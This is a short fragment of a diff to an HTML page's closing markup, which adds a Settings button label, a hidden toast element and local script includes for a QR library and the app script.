+      <span>⚙️</span><span>Settings</span>
     </button>
   </nav>
 
-</div><!-- /app -->
+</div>
 
-<!-- TOAST -->
-<div id="toast" class="toast"></div>
+<!-- Toast -->
+<div id="toast" class="toast hidden"></div>
 
-<script src="app.js"></script>
+<script src="js/qr.min.js"></script>
+<script src="js/app.js"></script>
 </body>
 </html>
